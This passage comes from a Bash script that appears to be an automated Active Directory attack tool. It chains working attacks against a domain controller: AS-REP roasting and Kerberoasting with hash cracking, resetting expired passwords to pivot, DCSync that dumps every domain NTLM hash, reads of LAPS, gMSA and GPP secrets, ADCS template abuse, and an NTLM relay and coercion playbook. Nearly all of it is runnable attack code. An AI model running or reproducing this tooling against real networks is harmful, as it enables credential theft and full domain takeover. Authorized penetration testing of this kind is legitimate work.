    [[ "$CAP_KERBEROS" != "1" ]] && { warn "Kerberos (88) not exposed → AS-REP roasting not possible"; return; }
    have impacket-GetNPUsers || { warn "impacket-GetNPUsers unavailable, skipping"; return; }
    local outf="$OUTDIR/asrep_hashes.txt"

    if [[ "$HAVE_AUTH" == "1" ]]; then
        subsection "Authenticated roast (LDAP auto-selects preauth-less users)"
        if [[ -n "$KERB_TICKET" ]]; then
            run "impacket-GetNPUsers $(imp_principal) -k -no-pass -dc-host ${DC_FQDN:-$DC_IP} -request -format hashcat"
            KRB5CCNAME="$KERB_TICKET" impacket-GetNPUsers "$(imp_principal)" -k -no-pass -dc-host "${DC_FQDN:-$DC_IP}" -request -format hashcat 2>&1 \
                | tee -a "$LOGFILE" | grep -E '^\$krb5asrep\$' >>"$outf"
        elif [[ -n "$HASH" ]]; then
            run "impacket-GetNPUsers $(imp_principal) -hashes :$HASH -dc-ip $DC_IP -request -format hashcat"
            impacket-GetNPUsers "$(imp_principal)" -hashes ":$HASH" -dc-ip "$DC_IP" -request -format hashcat 2>&1 \
                | tee -a "$LOGFILE" | grep -E '^\$krb5asrep\$' >>"$outf"
        else
            run "impacket-GetNPUsers $(imp_principal):*** -dc-ip $DC_IP -request -format hashcat"
            impacket-GetNPUsers "$(imp_principal):${PASS}" -dc-ip "$DC_IP" -request -format hashcat 2>&1 \
                | tee -a "$LOGFILE" | grep -E '^\$krb5asrep\$' >>"$outf"
        fi
    else
        # Unauthenticated: pick a user source dynamically
        local userfile=""
        if [[ -s "$OUTDIR/users_all.txt" ]]; then
            userfile="$OUTDIR/users_all.txt"
            subsection "Unauth roast against $(wc -l <"$userfile") discovered users"
        elif [[ -z "$USER" && -z "$HASH" ]]; then
            userfile="$OUTDIR/_asrep_seed.txt"; head -n 5000 "$USERLIST" 2>/dev/null >"$userfile"
            subsection "No creds and no users → seeding from top 5000 usernames"
        else
            info "Have credentials but no users yet → deferring AS-REP to the authenticated pass"
            return
        fi
        [[ ! -s "$userfile" ]] && { warn "No usable user source for AS-REP"; return; }
        run "impacket-GetNPUsers $DOMAIN/ -no-pass -usersfile <list> -dc-ip $DC_IP -format hashcat"
        impacket-GetNPUsers "${DOMAIN}/" -no-pass -usersfile "$userfile" -dc-ip "$DC_IP" -format hashcat 2>&1 \
            | tee -a "$LOGFILE" | grep -E '^\$krb5asrep\$' >>"$outf"
    fi

    if [[ -s "$outf" ]]; then
        sort -u -o "$outf" "$outf"
        loot "AS-REP hashes captured!"
        while read -r h; do echo -e "      ${C_MAGENTA}${h:0:80}…${C_RESET}"; done <"$outf"
        ok "Saved to asrep_hashes.txt (crack with: hashcat -m 18200)"
        [[ "$DO_CRACK" == "1" ]] && crack_hashes "$outf" 18200 "AS-REP"
    else
        info "No AS-REP-roastable users found"
    fi
}

# Expired / must-change password: with the known (old) plaintext we can set a
# new one over kpasswd and use the account immediately — a real path, not a dead end.
_change_expired_password() {
    [[ -z "$PASS" ]] && return 1            # need current plaintext to change it
    local tool; tool=$(command -v changepasswd.py || command -v impacket-changepasswd) || return 1
    local newpw="$PIVOT_PW" host="${DC_FQDN:-$DC_IP}"
    warn "Password for '${USER}' is EXPIRED / must change — resetting via kpasswd to regain access"
    confirm "  Set a new password for '${USER}' (expired anyway) and continue as them?" || return 1
    run "$tool $DOMAIN/$USER:***@$host -newpass *** -p kpasswd -dc-ip $DC_IP"
    if "$tool" "$DOMAIN/$USER:$PASS@$host" -newpass "$newpw" -p kpasswd -dc-ip "$DC_IP" 2>&1 \
         | tee -a "$LOGFILE" | grep -qiE 'changed successfully|password was changed|success'; then
        loot "★ Changed expired password for '${USER}' → pivoting as that user"
        rb_record "Changed expired password for $USER (was expired; original unknown)" \
                  "echo 'Manual: coordinate password restore for $USER with the client'"
        add_secret "$newpw" "expired-password reset for $USER"
        note_cred_source "$USER" "expired-password reset via kpasswd"
        unset 'SEEN_CREDS[${USER,,}]'
        queue_cred "$USER" "$newpw" ""
        return 0
    fi
    warn "Could not change the expired password for '${USER}'"; return 1
}

# Read the WHY behind a failed Kerberos auth and act on it. Returns 0 when the
# failure is explained (so we stop second-guessing it as a generic bad cred).
_classify_auth_error() {
    local out="$1"
    if echo "$out" | grep -qiE 'KEY_EXPIRED|PWD_EXPIRED|password.*expired|must.*change.*password'; then
        _change_expired_password; return 0
    elif echo "$out" | grep -qiE 'CLIENT_REVOKED|ACCOUNT.?DISABLED|account is disabled|revoked|LOCKED|account.*lock'; then
        warn "Account '${USER}' is DISABLED / LOCKED / REVOKED — creds may be valid once re-enabled/unlocked"
        note_cred_source "$USER" "valid-but-disabled/locked (enable to use)"
        echo "$USER" >>"$OUTDIR/disabled_or_locked.txt"; return 0
    elif echo "$out" | grep -qiE 'C_PRINCIPAL_UNKNOWN|PRINCIPAL_UNKNOWN|client not found|CLIENT_NOT_FOUND'; then
        warn "Account '${USER}' does NOT exist — it may be DELETED (check AD Recycle Bin / restore it)"; return 0
    elif echo "$out" | grep -qiE 'PREAUTH_FAILED|wrong password|LOGON_FAILURE|preauthentication'; then
        err "Wrong password for '${USER}'"; return 0
    elif echo "$out" | grep -qiE 'SKEW|clock'; then
        warn "Clock skew vs DC — sync time (sudo ntpdate $DC_IP) and retry '${USER}'"; return 0
    fi
    return 1
}

# ===========================================================================
#  PHASE 4 — CREDENTIAL VALIDATION + KERBEROS TGT
# ===========================================================================
phase_validate_creds() {
    [[ -z "$USER" ]] && return
    section "PHASE 4 · KERBEROS TGT + CREDENTIAL VALIDATION"

    # --- Step 1: request the TGT FIRST. getTGT talks to -dc-ip directly, so it
    # works even before DNS/hosts is sorted, and a successful TGT is definitive
    # proof the credentials are valid. ---
    if [[ "$KERBEROS" == "1" ]] && have impacket-getTGT && [[ -n "$DOMAIN" ]]; then
        subsection "Requesting Kerberos TGT first (-dc-ip, DNS-independent)"
        local tgt="$OUTDIR/$(_safe_name "$USER").ccache" tgtout=""
        rm -f "${USER}.ccache"
        if [[ -n "$HASH" ]]; then
            run "impacket-getTGT $(imp_principal) -hashes :$HASH -dc-ip $DC_IP"
            tgtout=$(impacket-getTGT "$(imp_principal)" -hashes ":$HASH" -dc-ip "$DC_IP" 2>&1)
        else
            run "impacket-getTGT $(imp_principal):*** -dc-ip $DC_IP"
            tgtout=$(impacket-getTGT "$(imp_principal):${PASS}" -dc-ip "$DC_IP" 2>&1)
        fi
        echo "$tgtout" | tee -a "$LOGFILE"
        if [[ -f "${USER}.ccache" ]]; then
            mv -f "${USER}.ccache" "$tgt" 2>/dev/null
            export KRB5CCNAME="$tgt"; KERB_TICKET="$tgt"; HAVE_AUTH=1
            ok "TGT obtained → ${C_BOLD}credentials are valid${C_RESET}"
            loot "Reusable Kerberos ticket → KRB5CCNAME=$tgt"
            note_cred_source "$USER" "authenticated (TGT obtained)"
        else
            # Classify WHY: expired password (recoverable!), disabled/locked,
            # nonexistent (deleted?), clock skew, or simply wrong password.
            _classify_auth_error "$tgtout" && return
            warn "Could not obtain TGT (bad creds, clock skew, or wrong domain)"
        fi
    fi

    # --- Step 2: confirm over SMB (reuses the cached ticket via --use-kcache) ---
    subsection "Validating ${USER} against the DC"
    local args; mapfile -t args < <(nxc_cred_args)
    run "$NXC smb $DCT ${args[*]}"
    local out; out=$($NXC smb "$DCT" "${args[@]}" 2>&1); echo "$out" | tee -a "$LOGFILE"

    if echo "$out" | grep -q '\[+\]'; then
        HAVE_AUTH=1
        ok "Valid credentials for ${C_BOLD}$USER${C_RESET}"
        echo "$out" | grep -qiE '\(Pwn3d!\)|\(admin\)' \
            && loot "★★★ ${USER} is LOCAL ADMIN on the DC — direct path to DCSync ★★★"
    elif [[ "$HAVE_AUTH" == "1" ]]; then
        warn "SMB check inconclusive, but the TGT proves the creds — proceeding authenticated"
    else
        # No Kerberos / NTLM fallback path that also failed
        if [[ -n "$HASH" || -n "$PASS" ]] && [[ "$KERBEROS" != "1" ]]; then
            err "Credentials NOT valid for $USER (continuing unauthenticated)"; return
        fi
        err "Could not authenticate $USER (continuing unauthenticated)"; return
    fi
}

# ===========================================================================
#  PHASE 5 — AUTHENTICATED ENUMERATION
# ===========================================================================
AUTH_ENUM_DONE=0
phase_auth_enum() {
    [[ "$HAVE_AUTH" != "1" ]] && return
    local args; mapfile -t args < <(nxc_cred_args)

    # ---- Domain-wide enumeration: users, groups, password policy, descriptions,
    # MAQ. Any authenticated identity sees the SAME thing here, so running it for
    # every pivoted credential is just noise — do it ONCE. Per-identity facts
    # (readable shares, LAPS/gMSA, ACLs, WinRM, …) still re-run in their phases.
    if [[ "$AUTH_ENUM_DONE" != "1" ]]; then
        AUTH_ENUM_DONE=1
        section "PHASE 5 · AUTHENTICATED ENUMERATION (domain-wide — runs once)"

        subsection "Password policy"
        run "$NXC smb $DCT ${args[*]} --pass-pol"
        $NXC smb "$DCT" "${args[@]}" --pass-pol 2>&1 | tee -a "$LOGFILE" | tee "$OUTDIR/pass_policy.txt"

        subsection "Domain users"
        run "$NXC smb $DCT ${args[*]} --users"
        $NXC smb "$DCT" "${args[@]}" --users 2>&1 | tee -a "$LOGFILE" | tee "$OUTDIR/domain_users.txt"
        # Extract clean usernames (rows whose date column is a date or <never>) and
        # merge into the master list so the summary + any user-driven logic see them.
        awk '$6 ~ /^[0-9]{4}-[0-9]{2}-[0-9]{2}$/ || $6=="<never>" {print $5}' "$OUTDIR/domain_users.txt" 2>/dev/null \
            | grep -vE '^$' | sort -u >"$OUTDIR/users_enum.txt"
        if [[ -s "$OUTDIR/users_enum.txt" ]]; then
            cat "$OUTDIR"/users_*.txt 2>/dev/null | sort -u >"$OUTDIR/users_all.txt"
            loot "$(wc -l <"$OUTDIR/users_enum.txt") domain users enumerated → users_all.txt"
        fi

        subsection "Domain groups"
        run "$NXC smb $DCT ${args[*]} --groups"
        $NXC smb "$DCT" "${args[@]}" --groups 2>&1 | tee -a "$LOGFILE" | tee "$OUTDIR/domain_groups.txt"

        if [[ "$CAP_LDAP" == "1" ]]; then
            subsection "User descriptions (often leak passwords)"
            run "$NXC ldap $DCT ${args[*]} -M get-desc-users"
            $NXC ldap "$DCT" "${args[@]}" -M get-desc-users 2>&1 | tee -a "$LOGFILE" | tee "$OUTDIR/user_descriptions.txt"
            grep -iE 'pass|pwd|cred' "$OUTDIR/user_descriptions.txt" 2>/dev/null \
                && loot "Possible passwords in descriptions! review user_descriptions.txt"

            subsection "Quick privilege-escalation indicators (LDAP modules)"
            for mod in maq adcs; do
                run "$NXC ldap $DCT ${args[*]} -M $mod"
                $NXC ldap "$DCT" "${args[@]}" -M "$mod" 2>&1 | tee -a "$LOGFILE"
            done
            info "MachineAccountQuota > 0 → potential escalation via machine accounts (RBCD)"
        else
            subsection "LDAP not exposed → secondary enumeration via rpcclient"
            if [[ "$CAP_RPC" == "1" || "$CAP_SMB" == "1" ]]; then
                local pw="${PASS:-}"; [[ -n "$HASH" ]] && pw="$HASH"
                run "rpcclient -U '$DOMAIN/$USER%***' $DC_IP -c 'enumdomusers;querydispinfo'"
                rpcclient -U "${DOMAIN}/${USER}%${pw}" "$DC_IP" -c 'enumdomusers;querydispinfo' 2>&1 \
                    | tee -a "$LOGFILE" | tee "$OUTDIR/rpc_users_auth.txt"
            else
                warn "No LDAP/RPC/SMB for secondary enum — limited visibility"
            fi
        fi
    fi

    # ---- Per-identity: which shares THIS credential can actually read varies by
    # user, so this part runs every pivot. Saved per-user to keep each view.
    local uf; uf="$(_safe_name "$USER")"
    subsection "Readable shares as ${USER}"
    run "$NXC smb $DCT ${args[*]} --shares"
    $NXC smb "$DCT" "${args[@]}" --shares 2>&1 | tee -a "$LOGFILE" | tee "$OUTDIR/shares_auth_${uf}.txt" "$OUTDIR/shares_auth.txt"
}

# ===========================================================================
#  PHASE 6 — KERBEROASTING
# ===========================================================================
phase_kerberoast() {
    [[ "$HAVE_AUTH" != "1" ]] && return
    # Any authenticated user can request a TGS for every SPN, so the roastable set
    # is domain-wide — request it ONCE, not once per pivoted identity. (--abuse
    # WriteSPN handles roasting any account it newly SPN-enables on its own.)
    [[ "$KERB_DONE" == "1" ]] && return
    KERB_DONE=1
    section "PHASE 6 · KERBEROASTING (service accounts with SPNs)"
    [[ "$CAP_KERBEROS" != "1" ]] && { warn "Kerberos (88) not exposed → Kerberoasting not possible"; return; }
    have impacket-GetUserSPNs || { warn "impacket-GetUserSPNs unavailable, skipping"; return; }
    local outf="$OUTDIR/kerberoast_hashes.txt"

    subsection "Requesting TGS tickets for SPN-enabled accounts"
    if [[ -n "$KERB_TICKET" ]]; then
        run "KRB5CCNAME=$KERB_TICKET impacket-GetUserSPNs $(imp_principal) -k -no-pass -dc-host ${DC_FQDN:-$DC_IP} -request"
        KRB5CCNAME="$KERB_TICKET" impacket-GetUserSPNs "$(imp_principal)" -k -no-pass -dc-host "${DC_FQDN:-$DC_IP}" -request -outputfile "$outf" 2>&1 | tee -a "$LOGFILE"
    elif [[ -n "$HASH" ]]; then
        run "impacket-GetUserSPNs $(imp_principal) -hashes :$HASH -dc-ip $DC_IP -request"
        impacket-GetUserSPNs "$(imp_principal)" -hashes ":$HASH" -dc-ip "$DC_IP" -request -outputfile "$outf" 2>&1 | tee -a "$LOGFILE"
    else
        run "impacket-GetUserSPNs $(imp_principal):*** -dc-ip $DC_IP -request"
        impacket-GetUserSPNs "$(imp_principal):${PASS}" -dc-ip "$DC_IP" -request -outputfile "$outf" 2>&1 | tee -a "$LOGFILE"
    fi

    if [[ -s "$outf" ]]; then
        loot "Kerberoast hashes captured!"
        while read -r h; do echo -e "      ${C_MAGENTA}${h:0:80}…${C_RESET}"; done <"$outf"
        ok "Saved to kerberoast_hashes.txt (crack with: hashcat -m 13100)"
        [[ "$DO_CRACK" == "1" ]] && crack_hashes "$outf" 13100 "Kerberoast"
    else
        info "No Kerberoastable accounts found (no SPNs configured)"
    fi
}

# ===========================================================================
#  PHASE 7 — ADCS / CERTIPY  (vulnerable certificate templates)
# ===========================================================================
phase_adcs() {
    [[ "$HAVE_AUTH" != "1" ]] && return
    section "PHASE 7 · ADCS — VULNERABLE CERTIFICATE TEMPLATES (Certipy)"
    have certipy || { warn "certipy unavailable, skipping"; return; }

    subsection "certipy find — scanning for ESC1..ESC16"
    # certipy's Kerberos LDAP bind is unreliable (fails with 'invalidCredentials …
    # data 52e/57'), and most labs keep NTLM enabled — so PREFER password/hash auth
    # and hand certipy the DC's DNS name via -target (it needs it). Fall back to
    # Kerberos (with -dc-host + KRB5CCNAME) only when that's all we have, or when
    # the password/NTLM bind is refused (i.e. NTLM disabled on the DC).
    local cbase=(-u "${USER}@${DOMAIN}" -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}") cauth=() cenv=()
    if   [[ -n "$PASS" ]]; then cauth=(-p "$PASS")
    elif [[ -n "$HASH" ]]; then cauth=(-hashes ":$HASH")
    elif [[ -n "$KERB_TICKET" ]]; then cauth=(-k -no-pass -dc-host "${DC_FQDN:-$DCT}"); cenv=(env "KRB5CCNAME=$KERB_TICKET"); fi
    run "certipy find ${cbase[*]} ${cauth[*]} -stdout -vulnerable"
    local cout; cout=$("${cenv[@]}" certipy find "${cbase[@]}" "${cauth[@]}" -stdout -vulnerable 2>&1)
    # Password/NTLM bind refused but we have a ticket → retry over Kerberos.
    if grep -qiE 'authentication failed|invalidCredentials|NTLM.*failed|STATUS_' <<<"$cout" \
       && [[ -n "$KERB_TICKET" && "${cauth[0]}" != "-k" ]]; then
        warn "certipy password/NTLM bind failed → retrying over Kerberos"
        cauth=(-k -no-pass -dc-host "${DC_FQDN:-$DCT}"); cenv=(env "KRB5CCNAME=$KERB_TICKET")
        cout=$("${cenv[@]}" certipy find "${cbase[@]}" "${cauth[@]}" -stdout -vulnerable 2>&1)
    fi
    echo "$cout" | tee -a "$LOGFILE"; echo "$cout" >"$OUTDIR/certipy_find.txt"

    # full structured output (BloodHound + JSON) for later analysis
    "${cenv[@]}" certipy find "${cbase[@]}" "${cauth[@]}" -output "$OUTDIR/certipy" >/dev/null 2>&1

    if echo "$cout" | grep -qiE 'ESC[0-9]+'; then
        local escs; escs=$(echo "$cout" | grep -oiE 'ESC[0-9]+' | sort -u | tr '\n' ' ')
        loot "★★★ Vulnerable ADCS detected: $escs ★★★"
        warn "Review certipy_find.txt — possible escalation to Domain Admin via certificates"
        echo "$cout" | grep -iE 'Template Name|ESC[0-9]+|Enrollment Rights|Vulnerab' | sed 's/^/      /'
        info "e.g. ESC1:  certipy req -u $USER@$DOMAIN -ca <CA> -template <TPL> -upn administrator@$DOMAIN -dc-ip $DC_IP"
        _abuse_adcs "$cout"
    else
        info "No automatically exploitable templates detected"
    fi
}

# ===========================================================================
#  PHASE 8 — BLOODHOUND COLLECTION
# ===========================================================================
phase_bloodhound() {
    [[ "$HAVE_AUTH" != "1" || "$DO_BLOODHOUND" != "1" ]] && return
    section "PHASE 8 · BLOODHOUND — ATTACK GRAPH COLLECTION"
    have bloodhound-python || { warn "bloodhound-python unavailable, skipping"; return; }

    subsection "Collecting all methods (All)"
    local bh_out="$OUTDIR/bloodhound"; mkdir -p "$bh_out"
    local bargs=(-d "$DOMAIN" -u "$USER" -ns "$DC_IP" -c All --zip)
    [[ -n "$HASH" ]] && bargs+=(--hashes ":$HASH")
    [[ -n "$PASS" ]] && bargs+=(-p "$PASS")
    [[ "$KERBEROS" == "1" ]] && bargs+=(-k --dns-tcp)
    run "bloodhound-python ${bargs[*]}"
    ( cd "$bh_out" && bloodhound-python "${bargs[@]}" 2>&1 ) | tail -30 | tee -a "$LOGFILE"
    local zip; zip=$(ls -t "$bh_out"/*.zip 2>/dev/null | head -1)
    [[ -n "$zip" ]] && loot "BloodHound data ready → $zip (import into the GUI)"
}

# ===========================================================================
#  PHASE 9 — DCSYNC / SECRETSDUMP
# ===========================================================================
phase_dcsync() {
    [[ "$HAVE_AUTH" != "1" ]] && return
    section "PHASE 9 · DCSYNC / SECRETSDUMP — DOMAIN HASH DUMP"
    have impacket-secretsdump || { warn "impacket-secretsdump unavailable, skipping"; return; }
    local outf="$OUTDIR/secretsdump.txt"

    subsection "Attempting DCSync (requires DA / replication rights)"
    info "If this fails, the current account lacks the privileges — that's expected."
    if [[ -n "$KERB_TICKET" ]]; then
        run "KRB5CCNAME=$KERB_TICKET impacket-secretsdump -k -no-pass ${DC_FQDN:-$DC_IP} -just-dc"
        KRB5CCNAME="$KERB_TICKET" impacket-secretsdump -k -no-pass "${DC_FQDN:-$DC_IP}" -just-dc -outputfile "$OUTDIR/dcsync" 2>&1 | tee -a "$LOGFILE" | tee "$outf"
    elif [[ -n "$HASH" ]]; then
        run "impacket-secretsdump $(imp_principal)@$DC_IP -hashes :$HASH -just-dc"
        impacket-secretsdump "$(imp_principal)@$DC_IP" -hashes ":$HASH" -just-dc -outputfile "$OUTDIR/dcsync" 2>&1 | tee -a "$LOGFILE" | tee "$outf"
    else
        run "impacket-secretsdump $(imp_principal):***@$DC_IP -just-dc"
        impacket-secretsdump "$(imp_principal):${PASS}@$DC_IP" -just-dc -outputfile "$OUTDIR/dcsync" 2>&1 | tee -a "$LOGFILE" | tee "$outf"
    fi

    if grep -qE ':::' "$outf" 2>/dev/null; then
        loot "★★★★★ DCSYNC SUCCESSFUL — ENTIRE DOMAIN NTLM HASHES DUMPED ★★★★★"
        ok "$(grep -cE ':::' "$outf") NTLM hashes dumped:"
        grep -E ':::' "$outf" | while read -r line; do
            local u nt; u=$(echo "$line" | cut -d: -f1); nt=$(echo "$line" | cut -d: -f4)
            echo -e "      ${C_RED}${C_BOLD}$u${C_RESET} : ${C_MAGENTA}$nt${C_RESET}"
        done
        grep -iE '^administrator:' "$outf" | head -1 | while read -r l; do
            loot "ADMINISTRATOR HASH: $(echo "$l" | cut -d: -f4)"
        done
        ok "Full dump in secretsdump.txt → Pass-the-Hash ready"
        if [[ "$DO_CRACK" == "1" ]]; then
            grep -E ':::' "$outf" | awk -F: '{print $4}' | sort -u >"$OUTDIR/ntlm_hashes.txt"
            crack_hashes "$OUTDIR/ntlm_hashes.txt" 1000 "NTLM"
        fi
    else
        warn "DCSync not authorized with these credentials (not DA / no replication rights)"
    fi
}

# ===========================================================================
#  SECRETS  —  LAPS + gMSA  (quick, high-value reads)
# ===========================================================================
phase_secrets() {
    [[ "$HAVE_AUTH" != "1" ]] && return
    section "SECRETS · LAPS & gMSA READS"
    [[ "$CAP_LDAP" != "1" ]] && { warn "LDAP not exposed → LAPS/gMSA reads need LDAP, skipping"; return; }
    local args; mapfile -t args < <(nxc_cred_args)

    subsection "LAPS — local admin passwords readable by this account"
    run "$NXC ldap $DCT ${args[*]} -M laps"
    local laps; laps=$($NXC ldap "$DCT" "${args[@]}" -M laps 2>&1); echo "$laps" | tee -a "$LOGFILE"
    echo "$laps" | grep -iE 'Computer:|Password:' >"$OUTDIR/laps.txt"
    if grep -qi 'Password:' "$OUTDIR/laps.txt" 2>/dev/null; then
        loot "★ LAPS passwords readable! → laps.txt (local admin on those hosts)"
    fi

    subsection "GPP passwords (cpassword in SYSVOL — classic AD leak)"
    run "$NXC smb $DCT ${args[*]} -M gpp_password"
    $NXC smb "$DCT" "${args[@]}" -M gpp_password 2>&1 | tee -a "$LOGFILE" | tee "$OUTDIR/gpp.txt"
    while read -r p; do
        [[ -n "$p" ]] && { loot "GPP cpassword recovered: ${C_GREEN}$p${C_RESET}"; add_secret "$p" "GPP cpassword (SYSVOL)"; }
    done < <(grep -oiP 'password:\s*\K\S+' "$OUTDIR/gpp.txt" 2>/dev/null)

    subsection "gMSA — group Managed Service Account hashes"
    run "$NXC ldap $DCT ${args[*]} --gmsa"
    local gmsa; gmsa=$($NXC ldap "$DCT" "${args[@]}" --gmsa 2>&1); echo "$gmsa" | tee -a "$LOGFILE"
    echo "$gmsa" | grep -iE 'Account:|NTLM:' >"$OUTDIR/gmsa.txt"
    # Queue any gMSA account whose NT hash we recovered. Parse each line as a unit:
    # the account ends in '$' (machine account), so the old `grep -i "$acc"` lookup
    # treated that '$' as a regex end-anchor and never matched → the hash was
    # dropped and the gMSA account (ending in '$') never got pivoted.
    while IFS= read -r line; do
        local acc h
        acc=$(grep -oiP 'Account:\s*\K\S+'        <<<"$line" | head -1)
        h=$(grep -oiP 'NTLM:\s*\K[a-fA-F0-9]{32}' <<<"$line" | head -1)
        [[ -n "$acc" && -n "$h" ]] && {
            loot "★ gMSA hash recovered for ${C_BOLD}$acc${C_RESET}: ${C_MAGENTA}$h${C_RESET}"
            note_cred_source "$acc" "gMSA password read (NT hash)"
            queue_cred "$acc" "" "$h"; }
    done < <(echo "$gmsa" | grep -iE 'Account:.*NTLM:')
}

# ===========================================================================
#  NTLM RELAY & COERCION  —  detect relay/coercion conditions, give playbook
#  (relaying is interactive: we DETECT + hand you the exact commands, we don't
#   blindly fire listeners mid-scan)
# ===========================================================================
phase_relay() {
    [[ "$HAVE_AUTH" != "1" || "$CAP_SMB" != "1" ]] && return
    section "NTLM RELAY & COERCION ASSESSMENT"
    local args; mapfile -t args < <(nxc_cred_args)
    local lhost; lhost=$(ip route get "$DC_IP" 2>/dev/null | grep -oP 'src \K\S+' | head -1)

    subsection "SMB signing (relay to SMB viable only if NOT required)"
    local s; s=$($NXC smb "$DCT" "${args[@]}" 2>&1 | head -1); echo "$s" | tee -a "$LOGFILE"
    if echo "$s" | grep -qi 'signing:False'; then loot "★ SMB signing NOT required → NTLM relay to SMB possible"
    else info "SMB signing required (typical on a DC) — SMB relay blocked here"; fi

    if [[ "$CAP_LDAP" == "1" ]]; then
        subsection "LDAP signing & channel binding (relay → LDAP: RBCD / shadow creds / ESC8)"
        # ldap-checker resolves the target's FQDN itself. If it isn't resolvable
        # (no /etc/hosts entry / no DNS) it throws a stacktrace — fall back to the
        # DC IP as target so the module actually runs.
        local ltgt="$DCT"
        if [[ "$DCT" == "$DC_FQDN" ]] && ! getent hosts "$DC_FQDN" >/dev/null 2>&1; then
            ltgt="$DC_IP"; info "FQDN $DC_FQDN not resolvable → using $DC_IP for ldap-checker"
        fi
        run "$NXC ldap $ltgt ${args[*]} -M ldap-checker"
        $NXC ldap "$ltgt" "${args[@]}" -M ldap-checker 2>&1 \
            | grep -avE 'Traceback|File \"|    [│┃|]|self\.|raise |[A-Za-z]+Error:|connection\.py' \
            | tee -a "$LOGFILE" | tee "$OUTDIR/relay_ldap.txt"
        # Only read the LDAP-CHECKER verdict lines (avoid matching 'SMBv1:False' etc.)
        local lc; lc=$(grep -i 'LDAP-CHE' "$OUTDIR/relay_ldap.txt")
        if echo "$lc" | grep -qiE 'Connection fail|Name or service|Errno|timed out|error'; then
            warn "ldap-checker could not run (Kerberos/DNS) → LDAP signing status UNKNOWN, verify manually"
        elif echo "$lc" | grep -qiE 'not (enforced|required)'; then
            loot "★ LDAP signing/channel-binding NOT enforced → relay to LDAP available (RBCD / shadow / ESC8)"
        elif echo "$lc" | grep -qiE 'enforced|required'; then
            info "LDAP signing / channel binding appears enforced — LDAP relay blocked"
        else
            info "LDAP signing status inconclusive — see relay_ldap.txt"
        fi
    fi

    subsection "Coercion vectors (force the DC to authenticate to us)"
    run "$NXC smb $DCT ${args[*]} -M coerce_plus"
    $NXC smb "$DCT" "${args[@]}" -M coerce_plus 2>&1 | tee -a "$LOGFILE" | tee "$OUTDIR/coerce.txt"
    grep -qiE 'VULNERABLE|is vuln|Success' "$OUTDIR/coerce.txt" 2>/dev/null \
        && loot "★ DC is coercible (PetitPotam/PrinterBug/DFSCoerce/MS-EVEN) → trigger auth for relay"
    $NXC smb "$DCT" "${args[@]}" -M spooler 2>&1 | tee -a "$LOGFILE" | grep -qi 'enabled' \
        && loot "★ Print Spooler enabled → PrinterBug (MS-RPRN) coercion available"
    $NXC smb "$DCT" "${args[@]}" -M webdav  2>&1 | tee -a "$LOGFILE" | grep -qi 'running\|enabled' \
        && loot "★ WebClient (WebDAV) running → HTTP coercion → relay to LDAP/ADCS"

    subsection "Relay playbook (run these yourself — needs your listeners)"
    echo -e "      ${C_GREY}# 1) Relay to LDAPS and escalate (RBCD/shadow-cred), or -t smb://<other-host>:${C_RESET}"
    echo -e "      ${C_CYAN}impacket-ntlmrelayx -t ldaps://$DC_IP --escalate-user $USER -smb2support${C_RESET}"
    echo -e "      ${C_GREY}# 2) Coerce the DC to auth to you (${lhost:-<your-ip>}):${C_RESET}"
    echo -e "      ${C_CYAN}coercer coerce -l ${lhost:-<your-ip>} -t $DC_IP -d $DOMAIN -u $USER -p '<pass>'${C_RESET}"
    echo -e "      ${C_GREY}# or passively: ${C_CYAN}sudo responder -I tun0${C_GREY} to poison & capture NetNTLM hashes${C_RESET}"
}

# ===========================================================================
#  DOMAIN / FOREST TRUSTS  —  enumerate and surface cross-forest attack paths
# ===========================================================================
phase_trusts() {
    [[ "$HAVE_AUTH" != "1" ]] && return
    section "TRUSTS · DOMAIN & CROSS-FOREST RELATIONSHIPS"
    [[ "$CAP_LDAP" != "1" ]] && { warn "LDAP not exposed → trust enumeration needs LDAP, skipping"; return; }
    local args; mapfile -t args < <(nxc_cred_args)
    local tf="$OUTDIR/trusts.txt"; : >"$tf"

    subsection "Enumerating trust relationships"
    # Primary: bloodyAD (clean, shows direction + type + transitivity)
    if have bloodyAD; then
        local ba; mapfile -t ba < <(bloody_args)
        run "bloodyAD ${ba[*]} get trusts"
        bloodyAD "${ba[@]}" get trusts 2>&1 | tee -a "$LOGFILE" | tee -a "$tf"
    fi
    # Second source: netexec module
    run "$NXC ldap $DCT ${args[*]} -M enum_trusts"
    $NXC ldap "$DCT" "${args[@]}" -M enum_trusts 2>&1 | tee -a "$LOGFILE" | tee -a "$tf"
    # Raw fallback: trustedDomain objects via LDAP
    if [[ -n "$DOMAIN" ]]; then
        local base="dc=${DOMAIN//./,dc=}"
        ldapsearch -x -H "ldap://$DC_IP" -b "$base" "(objectClass=trustedDomain)" \
            trustPartner trustDirection trustType trustAttributes flatName 2>/dev/null \
            | grep -iE 'trustPartner|trustDirection|trustType|trustAttributes|flatName' | tee -a "$tf"
    fi

    # Identify partner domains
    local partners; partners=$(grep -oiP 'trustPartner:\s*\K\S+' "$tf" 2>/dev/null | sort -u)
    [[ -z "$partners" ]] && partners=$(grep -oiP '(Target|Partner|Domain)\s*:?\s*\K[a-z0-9.-]+\.[a-z]{2,}' "$tf" 2>/dev/null | sort -u)
    # Drop the current domain. bloodyAD/enum_trusts/ldapsearch all echo our own
    # name (and FSP DNs like DC=corp,DC=local), and the loose fallback regex
    # would otherwise mistake it for a "trust" → we'd kerberoast ourselves and
    # print bogus cross-forest paths. A single-domain forest has no partners.
    partners=$(printf '%s\n' "$partners" | grep -vixF "$DOMAIN" | grep -vE '^[[:space:]]*$')

    if [[ -z "$partners" ]]; then
        info "No external/forest trusts found from this domain"
        return
    fi

    loot "Trust relationship(s) discovered:"
    echo "$partners" | while read -r d; do echo -e "      ${C_CYAN}↔${C_RESET} ${C_BOLD}$d${C_RESET}"; done

    subsection "Foreign Security Principals (accounts from trusted domains with access here)"
    if have bloodyAD; then
        local ba; mapfile -t ba < <(bloody_args)
        local fsp; fsp=$(bloodyAD "${ba[@]}" get search --filter '(objectClass=foreignSecurityPrincipal)' --attr cn 2>&1)
        printf '%s\n' "$fsp" >>"$tf"
        # Only real foreign principals are domain SIDs (S-1-5-21-…). Every domain
        # also has built-in well-known SIDs in this container (S-1-5-4 Interactive,
        # S-1-5-9 Enterprise DCs, S-1-5-11 Authenticated Users, S-1-5-17 IUSR…) —
        # they're not actionable, so don't surface them as "foreign access".
        local realfsp; realfsp=$(grep -oiE 'S-1-5-21-[0-9-]+' <<<"$fsp" | sort -u)
        if [[ -n "$realfsp" ]]; then
            while read -r s; do echo -e "      ${C_CYAN}$s${C_RESET}"; done <<<"$realfsp"
        else
